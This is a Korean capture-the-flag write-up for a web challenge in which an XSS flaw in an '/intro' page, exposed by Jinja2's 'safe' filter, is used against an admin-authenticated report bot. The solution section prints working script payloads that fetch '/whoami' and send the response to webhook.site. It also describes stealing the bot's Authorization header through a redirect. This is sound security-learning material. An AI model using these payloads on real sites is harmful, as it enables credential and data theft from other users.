## Are you admin?

- 유형: Web
- 해결 방식: 혼자 해결, 구글 검색 (fetch 스크립트)

### 문제 구조

목표: 크롬 봇이 `/whoami`로 접속할때 반환되는 플래그가 포함된 페이지에 접근

- `/intro`: 쿼리 파라미터 `name`, `detail`을 받아서 화면에 출력하는데 `name`은 XSS 취약점이 존재함. 
``` html
{{ name | safe }}   <- 이스케이프 없이 그대로 출력 -> XSS 가능
{{ detail }}        <- 필터 없음 -> Jinja2 기본 자동 이스케이프 -> XSS 불가
```

- `/report`: 
	- 폼에서 URL을 입력받음.
	- 크롬 봇에 Authorization 헤더 설정을 관리자 정보로 해둠. 
	- URL의 `name`, `detail` 파라미터를 이용해서 크롬 봇이 `http://127.0.0.1:8000/intro?name={quote(name)}&detail={quote(detail)}`로 접속함. 
``` python
driver.execute_cdp_cmd(
	'Network.setExtraHTTPHeaders',
	{'headers': {'Authorization': f'Basic {encoded_user_info}'}}
)
```

- `/whoami`: Authorization 헤더 값이 관리자 정보인 경우에 플래그가 포함된 `whoami.html` 페이지 반환

### 분석 및 풀이

`/report`를 통해서 Authorization 헤더에 관리자 정보를 담을 수 있으므로 `/report`에서 `/whoami`에 요청을 보내고 그 응답데이터를 담은 요청을 webhoook.site로 보내도록 해야함. 

`/intro`에 XSS 취약점이 있으므로 `intro?name=<script>...</script>&detail=123` 경로에서 스크립트가 실행될 수 있으므로 `/report` 폼에 해당 경로를 입력해서 보냄.
``` html 
<!-- 1. URL 인코딩을 활용 -->
<script>
fetch('/whoami')
  .then(res => res.text())
  .then(data => {
    fetch(`https://webhook.site?param=${encodeURIComponent(data)}`);
  });
</script>

<!-- 2. 정규식 활용 -->
<script>
fetch('/whoami')
	.then(res => res.text())
	.then(data => {
	    const match = data.match(/Message:<\/strong>(.*?)<\/p>/);
	    fetch(`https://webhook.site?param=${match[0]}`);
})
</script>

```

### 시행 착오 

`/whoami`에서 받은 응답 데이터를 webhook.site로 보내는 것에 애를 많이 먹었음. 
- URL에 `+`가 들어가면 정상적으로 작동하지 않음. 
- 응답 HTML에 들어가는 특수문자 때문에 바로 URL에 넣으면 작동하지 않을 가능성이 있으므로 `encodeURIComponent`로 인코딩을 하거나 정규식으로 필요한 데이터만 뽑아서 포함해야함. 

### 새롭게 배운 점 

#### URL 파라미터

URL에 `+`는 들어가면 정상적인 동작을 하지 않음. 
HTML을 텍스트로 받아서 URL에 삽입해서 요청을 보낼때 
- URL에서 `#`은 fragment의 시작을 의미하고, `#` 이후의 문자열은 HTTP 요청에 포함되지 않음.
- `URLSearchParams` 또는 `encodeURIComponent()`를 이용해 HTML을 안전하게 URL 인코딩 해야함. 
- 정규식으로 필요한 부분만 추출해도 됨. 

#### CORS

`Authorization` 헤더 때문에 CORS Preflight 요청(OPTIONS)이 발생하고 `webhook.site`에서 거절하면 GET 요청은 발생하지 않음. 
`Authorization`은 CORS-safelisted request header가 아니기 때문에 Cross-Origin 요청에 포함되면 Preflight가 필요한 것임. 
=> OPTIONS 요청만으로도 쿼리파라미터를 활용하면 플래그를 획득할 수 있음. 

#### fetch

1. then 방식 
``` js
fetch('/whoami')
  .then(res => res.text())
  .then(data => {
      console.log(data);
  });
```

2. async/await 방식
``` js
async function run() {
    const result = await fetch('/whoami');
    const data = await result.text();

    console.log(data);
}

run();
```



### 다른 풀이

Authorization 헤더 탈취
- 접근: XSS로 외부 서버에 직접 이동하여 인증 헤더가 전송되는 특성을 이용
- 원인: 봇이 CDP `Network.setExtraHTTPHeaders`를 통해 `Authorization` 헤더를 설정함
- 결과: 획득한 Basic 인증정보를 이용해 `/whoami`에 직접 요청하여 FLAG 획득
- 새로 배운 점: CDP로 강제 설정한 HTTP 헤더의 적용 범위가 일반 브라우저 인증 처리와 다를 수 있음

일반적으로 브라우저가 다른 Origin으로 이동할때 (Cross-Origin Redirect) HTTP `Authorization` 헤더는 제거됨. 
이번 문제는 CDP로 헤더를 강제로 설정한 특수한 환경이라서 이 방식이 성공하는 것임. 